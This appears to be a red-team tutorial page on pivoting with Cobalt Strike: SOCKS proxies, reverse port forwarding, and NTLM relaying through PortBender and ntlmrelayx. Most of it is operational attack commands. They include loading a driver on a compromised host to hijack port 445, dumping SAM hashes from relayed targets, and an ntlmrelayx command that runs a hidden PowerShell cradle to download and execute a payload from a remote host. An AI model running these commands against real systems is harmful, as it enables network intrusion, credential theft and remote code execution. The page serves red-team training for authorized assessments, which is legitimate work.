---
title: Pivoting
category: Red Team
order: 10
---

Pivoting are post-explotaiton techniques that allows us to access to the network where we have just landed.

# SOCKS Proxies

A SOCKS (Secure Socket) Proxy exchanges network packets between a client and a server via a "proxy".

It's very useful when we need to leverage with others toolsets that are only available in linux such as impacket.

To start a socks proxy we can use:

```
beacon> socks [port]
```
> **Note**: The port will binding on the Team Server.

Finally we can access it with `proxychains`.

```
proxychains -q [command] [arguments]
```

# Windows Apps

It is also possible to tunnel Windows GUI apps using `proxifier`.

* [https://www.proxifier.com/](https://www.proxifier.com/)

With Proxifier we can specify which application we want to tunneling.


# Port Forwarding

I will not explain what is a port forwarding since is detailed on `Post-Exploitation` section on this gitbook, but we will discuss how to execute it from Cobalt Strike.

```
beacon> rportfwd 8080 10.10.10.10 80
[+] started reverse port forward on 8080 to 10.10.10.10:80
```

To stop the forwarding:

```
beacon> rportfw stop 8080
```

> **Notes**:
> * Beacon's reverse port forward always tunnels the traffic to the Team Server and the Team Server sends the traffic to its intended destintation.
> * The traffic is tunnelled inside the Beacon's C2 traffic, not over separate sockets.
> * You don't need to be a local admin to create reverse port forwards on high ports.

`rportfwd_local` will tunnel the traffic to the machine running Cobalt Strike client instead of the Team Server.

```
beacon> rportfwd_local 443 127.0.0.1 443
[+] started reverse port forward on 443 to mvc1009 -> 127.0.0.1:443
```

# NTLM Relaying

During an on-premise assessments, NTLM relaying with tools like `responder` and `ntlmrelayx` is quite trivial. However in red team assessment, is not quite trivial because port 445 is always bound and in use by Windows machines.

It's still possible with Cobalt Strike, but requires the use of multiple capabilities.

1. Use a driver `WinDivert` to redirect traffic destinated for port 445 to another port (4445). It requires local admin access in order for loading the driver. Upload the driver to `C:\Windows\System32\drivers` since this is where most windows drivers go.

```
beacon> cd C:\Windows\System32\drivers
beacon> upload C:\Tools\PortBender\WinDivert64.sys
```
 * PortBender: [https://github.com/praetorian-inc/PortBender](https://github.com/praetorian-inc/PortBender)

Load `PortBender.cna` aggressor script and redirect the traffic.

```
beacon> PortBender redirect 445 4445
```

2. Create a reverse port forwarding that will then relay the traffic from port 4445 to port 445 on the Team Server where `ntlmrelayx` will be waiting.

```
beacon> rportfwd 4445 127.0.0.1 445
```

3. A SOCKS proxy is required to allow `ntlmrelayx` to send traffic back into the network.

```
beacon> socks 5566
```

4. Finally on the Team Server execute the `ntlmrelayx` tool, by default will execute `secretsdump` to dump local SAM hashes on the target machine.

```
proxychains -q python3 /usr/local/bin/ntlmrelayx.py -t smb://<target-ip> -smb2support --no-http-server --no-wcf-server
```

Instead of dumping SAM we can execute payloads such as beacons.

```
proxychains -q python3 /usr/local/bin/ntlmrelayx.py -t smb://<target-ip> -smb2support --no-http-server --no-wcf-server -c 'powershell -nop -w hidden -c "IEX(New-Object Net-WebClient).DownloadString(\"http://10.10.10.10/a\")"'
```

To stop `PortBender` just kill the process.

```
beacon> jobs
[*] Jobs

 JID  PID   Description
 ---  ---   -----------
 0    1240  PortBender

beacon> jobkill 0
beacon> kill 1240
```